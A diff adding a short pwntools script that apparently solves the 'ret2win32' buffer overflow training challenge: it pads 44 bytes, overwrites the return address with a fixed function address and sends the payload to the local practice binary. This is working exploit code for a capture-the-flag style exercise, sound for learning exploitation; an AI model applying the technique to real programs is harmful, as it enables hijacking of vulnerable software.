@@ -1,0 +1,12 @@
+#!/usr/bin/python3
+from pwn import *
+
+payload = "A" * 44
+
+payload += "\x2c\x86\x04\x08"
+
+p = process("./ret2win32")
+
+p.sendline(payload) 
+
+p.interactive() 
